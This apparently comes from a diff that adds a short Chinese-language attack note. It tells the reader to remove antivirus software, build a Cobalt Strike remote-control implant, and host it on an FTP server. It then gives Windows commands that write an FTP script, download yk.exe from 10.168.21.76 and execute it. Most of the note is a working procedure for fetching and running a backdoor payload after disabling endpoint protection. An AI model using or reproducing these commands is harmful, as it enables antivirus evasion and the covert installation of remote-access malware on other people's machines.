@@ -1,0 +1,20 @@
+1.删掉杀软！！（可参考删火绒中代码，通过移动鼠标和打开窗口方式删掉杀软）
+1.打开“文件传输”中的FTPserver,选中下载文件，账户名称改为whb，密码改为123456
+2.找一个远控（我这里用cobaltstrike）
+3.将下面的yk.exe改为你生成的exe
+4.执行如下命令
+
+del /f /q "C:/2.txt"
+echo open 10.168.21.76>>C:/2.txt
+echo whb>>C:/2.txt
+echo 123456>>C:/2.txt
+echo lcd c:/>>C:/2.txt
+----------------------------------------------------
+echo cd Users/Administrator/Desktop>>C:/2.txt  
+echo get yk.exe>>C:/2.txt
+echo close>>C:/2.txt
+echo bye>>C:/2.txt
+ftp /s:C:/2.txt
+----------------------------------------------------
+C:/yk.exe
+
